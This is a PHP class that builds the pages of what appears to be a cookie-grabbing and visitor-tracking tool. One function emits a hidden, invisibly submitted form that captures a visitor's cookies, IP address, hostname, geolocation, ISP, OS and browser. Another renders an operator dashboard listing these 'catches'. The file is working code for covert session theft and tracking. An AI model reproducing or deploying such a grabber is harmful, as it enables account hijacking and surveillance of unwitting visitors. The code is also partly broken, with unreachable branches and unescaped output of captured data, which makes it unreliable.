<?php
class HTMLBuilder {
    public static function GetImportable($Type = null, $LandingPage = null) {
        $Type = (($Type !== null) && (strtolower($Type) === "css" || strtolower($Type) === "js" || strtolower($Type) === "both")) ? strtolower($Type) : null;

        if($Type !== null && ($LandingPage !== null && in_array(strtolower($LandingPage), ["index", "dashboard"]))) {
            switch(strtolower($Type)) {
                case "css":
                    return "<link rel=\"stylesheet\" type=\"text/css\" href=\"Css/" . ucfirst(strtolower($LandingPage)) . "." . $Type . "\" />";
                case "js":
                    return "<script src=\"JavaScript/" . ucfirst(strtolower($LandingPage)) . "." . $Type . "\"></script>";
                case "jquery":
                    return "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js\" integrity=\"sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>";
                case "font-awesome":
                    return "<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css\" integrity=\"sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />";
                case "both":
                    return "
                        <link rel=\"stylesheet\" type=\"text/css\" href=\"Css/" . ucfirst(strtolower($LandingPage)) . ".css\" />
                        <script src=\"JavaScript/" . ucfirst(strtolower($LandingPage)) . ".js\"></script>
                    ";

                default:
                    return null;
            }
        }
        
        return null;
    }

    public static function DashboardHeader(bool $WithSearch = false) {
        if($WithSearch === true) {
            echo "
                <div id=\"header\" class=\"header\">
                    <div id=\"header-brand-logo-container\" class=\"header-brand-logo-container\">
                        <img src=\"Favicon.png\" id=\"header-brand-logo-image\" class=\"header-brand-logo-image\" />
                        <button type=\"button\" id=\"header-brand-logo\" class=\"header-brand-logo\">" . Config::Get("AppData/Name") . "</button>
                    </div>
            
                    <div id=\"search-bar-container\" class=\"search-bar-container\">
                        <form class=\"search-form\" id=\"search-form\">
                            <input type=\"text\" id=\"search-bar-input\" name=\"search\" class=\"search-bar-input\" placeholder=\"Search\" />

                            <select class=\"toggle-search-type\" id=\"toggle-search-type\">
                                <option value=\"ip_address\">IP Address</option>
                                <option value=\"local_hostname\">Local Hostname</option>
                                <option value=\"hostname\">Hostname</option>
                                <option value=\"location\">Location</option>
                            </select>
                        </form>
                    </div>
                </div>
            ";
        } else {
            echo "
                <div class=\"header\" id=\"header\">
                    <div id=\"header-brand-logo-container\" class=\"header-brand-logo-container\">
                        <img src=\"Favicon.png\" id=\"header-brand-logo-image\" class=\"header-brand-logo-image\" />
                        <button type=\"button\" id=\"header-brand-logo\" class=\"header-brand-logo\">" . Config::Get("AppData/Name") . "</button>
                    </div>
                </div>
            ";
        }
    }

    public static function DashboardContainers() {
        $Catches = (new Database())::Select("catches", array(["id", "!=", ""]), null, ["order_by" => "catch_date", "order" => "DESC"]);

        if($Catches !== null && !empty($Catches)) {
            foreach($Catches as $Catch) {
                $Catch = (count($Catch) > 0 ? (object) $Catch : null);

                if($Catch !== null) {
                    echo "
                    <div id=\"catch-details-container__{$Catch->id}\" class=\"catch-details-container\">
                        <div id=\"catch-details-header-container__{$Catch->id}\" class=\"catch-details-header-container\">
                            <div id=\"catch-id-container__{$Catch->id}\" class=\"catch-id-container\">
                                <p id=\"catch-id-text__{$Catch->id}\" class=\"catch-id-text\">Catch ID: <span id=\"catch-id-inner-span__{$Catch->id}\" class=\"catch-id-inner-span\">{$Catch->id}</span></p>
                            </div>

                            <div id=\"catch-date-container__{$Catch->id}\" class=\"catch-date-container\">
                                <p id=\"catch-date-text__{$Catch->id}\" class=\"catch-date-text\">Date: <span id=\"catch-date-inner-span__{$Catch->id}\" class=\"catch-date-inner-span\">{$Catch->catch_date}</span></p>
                            </div>
                        </div>

                        <div id=\"catch-details-inner-container__{$Catch->id}\" class=\"catch-details-inner-container\">
                            <div id=\"catch-details-cookie-container__{$Catch->id}\" class=\"catch-details-cookie-container\">
                                <div id=\"catch-details-tile-header-container-cookie__{$Catch->id}\" class=\"catch-details-tile-header-container\">
                                    <span id=\"catch-details-tile-header-cookie__{$Catch->id}\" class=\"catch-details-tile-header\">Cookies</span>
                                </div>

                                " . ((!empty($Catch->cookie)) ? "
                                <p id=\"catch-display-row-data-cookie__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Cookie: <span id=\"row-data-span-cookie__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->cookie}</span>
                                </p>
                                " : null) . "

                                " . (($Catch->cookie === $Catch->decoded_cookie) ? "
                                <p id=\"catch-display-row-data-decoded-cookie__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Decoded Cookie: <span id=\"row-data-span-decoded-cookie__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->decoded_cookie}</span>
                                </p>
                                " : null) . "
                            </div>
        
                            <div id=\"catch-details-device-container__{$Catch->id}\" class=\"catch-details-device-container\">
                                <div id=\"catch-details-tile-header-container-device__{$Catch->id}\" class=\"catch-details-tile-header-container\">
                                    <span id=\"catch-details-tile-header-device__{$Catch->id}\" class=\"catch-details-tile-header\">Network &amp; Device</span>
                                </div>

                                " . ((!empty($Catch->ip_address)) ? "
                                <p id=\"catch-display-row-data-ip-address__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    IP Address: <span id=\"row-data-span-ip-address__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->ip_address}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->hostname)) ? "
                                <p id=\"catch-display-row-data-hostname__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Hostname: <span id=\"row-data-span-hostname__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->hostname}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->local_hostname)) ? "
                                <p id=\"catch-display-row-data-local-hostname__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Local Hostname: <span id=\"row-data-span-local-hostname__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->local_hostname}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->client_browser)) ? "
                                <p id=\"catch-display-row-data-client-browser__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Client Browser: <span id=\"row-data-span-client-browser__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->client_browser}</span>
                                </p>
                                " : null) . "
                                
                                " . ((!empty($Catch->client_os)) ? "
                                <p id=\"catch-display-row-data-client-os__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Client OS: <span id=\"row-data-span-client-os__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->client_os}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->user_agent)) ? "
                                <p id=\"catch-display-row-data-user-agent__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    User Agent: <span id=\"row-data-span-user-agent__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->user_agent}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->service_provider)) ? "
                                <p id=\"catch-display-row-data-service-provider__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Service Provider: <span id=\"row-data-span-service-provider__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->service_provider}</span>
                                </p>
                                " : null) . "
                            </div>
        
                            <div id=\"catch-details-location-container__{$Catch->id}\" class=\"catch-details-location-container\">
                                <div id=\"catch-details-tile-header-container-location__{$Catch->id}\" class=\"catch-details-tile-header-container\">
                                    <span id=\"catch-details-tile-header-location__{$Catch->id}\" class=\"catch-details-tile-header\">Location</span>
                                </div>

                                " . ((!empty($Catch->city)) ? "
                                <p id=\"catch-display-row-data-city__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    City: <span id=\"row-data-span-city__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->city}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->region)) ? "
                                <p id=\"catch-display-row-data-region__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Region: <span id=\"row-data-span-region__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->region}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->country)) ? "
                                <p id=\"catch-display-row-data-country__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Country: <span id=\"row-data-span-country__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->country}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->latitude)) ? "
                                <p id=\"catch-display-row-data-latitude__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Latitude: <span id=\"row-data-span-latitude__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->latitude}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->longitude)) ? "
                                <p id=\"catch-display-row-data-longitude__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Longitude: <span id=\"row-data-span-longitude__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->longitude}</span>
                                </p>
                                " : null) . "

                                " . ((!empty($Catch->timezone)) ? "
                                <p id=\"catch-display-row-data-timezone__{$Catch->id}\" class=\"catch-display-row-data-tile\">
                                    Timezone: <span id=\"row-data-span-timezone__{$Catch->id}\" class=\"row-data-span-tile\">{$Catch->timezone}</span>
                                </p>
                                " : null) . "
                            </div>
                        </div>
                    </div>
                    ";
                }
            }
        }
    }

    public static function CatchForm(string $IPAddress = null, array $Location = array(), string $UserAgent = null) {    
        echo "
            <form id=\"catch-form\" class=\"catch-form\" method=\"post\" action=\"\">
	        	<input type=\"hidden\" name=\"cookie-value\" id=\"cookie-value\" />
        		<input type=\"hidden\" name=\"decoded-cookie\" id=\"decoded-cookie\" />

        		<input type=\"hidden\" name=\"ip-address\" id=\"ip-address\" value=\"" . (($IPAddress !== null) ? $IPAddress : "Unknown IP Address") . "\" />
		        <input type=\"hidden\" name=\"user-agent\" id=\"user-agent\" value=\"" . (($UserAgent !== null) ? $UserAgent : "Unknown User Agent") . "\" />
        		<input type=\"hidden\" name=\"local-hostname\" id=\"local-hostname\" value=\"" . ((gethostname() !== false) ? gethostname() : "Unknown Local Hostname") . "\" />
        		<input type=\"hidden\" name=\"hostname\" id=\"hostname\" value=\"" . (($IPAddress !== null && gethostbyaddr($IPAddress) !== false) ? gethostbyaddr($IPAddress) : "Unknown Host Name") . "\" />
		        
                <input type=\"hidden\" name=\"city\" id=\"city\" value=\"" . (($Location !== null && array_key_exists("city", $Location)) ? $Location["city"] : "Unknown City") . "\" />
		        <input type=\"hidden\" name=\"region\" id=\"region\" value=\"" . (($Location !== null && array_key_exists("region", $Location)) ? $Location["region"] : "Unknown Region") . "\" />
		        <input type=\"hidden\" name=\"country\" id=\"country\" value=\"" . (($Location !== null && array_key_exists("country", $Location)) ? $Location["country"] : "Unknown Country") . "\" />
		        <input type=\"hidden\" name=\"latitude\" id=\"latitude\" value=\"" . (($Location !== null && array_key_exists("latitude", $Location)) ? $Location["latitude"] : "Unknown Latitude") . "\" />
		        <input type=\"hidden\" name=\"longitude\" id=\"longitude\" value=\"" . (($Location !== null && array_key_exists("longitude", $Location)) ? $Location["longitude"] : "Unknown Longitude") . "\" />
		        <input type=\"hidden\" name=\"service-provider\" id=\"service-provider\" value=\"" . (($Location !== null && array_key_exists("service_provider", $Location)) ? $Location["service_provider"] : "Unknown Service Provider") . "\" />
		        <input type=\"hidden\" name=\"timezone\" id=\"timezone\" value=\"" . (($Location !== null && array_key_exists("timezone", $Location)) ? $Location["timezone"] : "Unknown Timezone") . "\" />
		        
                
                <input type=\"hidden\" name=\"location\" id=\"location\" value=\"" . (($Location !== null && array_key_exists("full_location", $Location)) ? $Location["full_location"] : "Unknown Location") . "\" />
        		<input type=\"hidden\" name=\"client-os\" id=\"client-os\" value=\"" . (($UserAgent !== null && Client::GetOS($UserAgent) !== null) ? Client::GetOS($UserAgent) : "Unknown OS") . "\" />
	        	<input type=\"hidden\" name=\"client-browser\" id=\"client-browser\" value=\"" . (($UserAgent !== null && Client::GetBrowser($UserAgent) !== null) ? Client::GetBrowser($UserAgent) : "Unknown Browser") . "\" />
    	    </form>

        	<button form=\"catch-form\" name=\"submit\" id=\"submit\" style=\"display:none;\"></button>
        ";
    }

    public static function GetResponseContainer($ResponseType = null) {
        $LegalResponseContainerTypes = ["success", "error"];

        if($ResponseType !== null) {
            $ResponseContainerElement = null;

            if(is_string($ResponseType)) {
                $Type = ((in_array(lowercase($ResponseType), $LegalResponseContainerTypes)) ? lowercase($ResponseType) : null);

                $ResponseContainerElement = (($Type !== null) ? "<div id=\"response-container-{$Type}\" class=\"response-container-{$Type}\"></div>" : null);
            } else if(is_array($ResponseType) && count($ResponseType) > 0) {
                $ResponseContainerElement = "";

                foreach($ResponseType as $Type) {
                    $ResponseContainerElement .= ((in_array(lowercase($Type), $LegalResponseContainerTypes)) ? "<div id=\"response-container-{$Type}\" class=\"response-container-{$Type}\"></div>" : "");
                }

                $ResponseContainerElement = (($ResponseContainerElement !== "") ? $ResponseContainerElement : null);
            }

            echo $ResponseContainerElement;
        }
    }

    public static function GetFooter() {
        echo "
            <div class=\"footer\" id=\"footer\">
                <h6 class=\"footer-text\" id=\"footer-text\">" . escape(Config::Get("AppData/Name")) . " " . escape(Config::Get("AppData/Version")) . "</h6>
            </div>
        ";
    }
}
?>
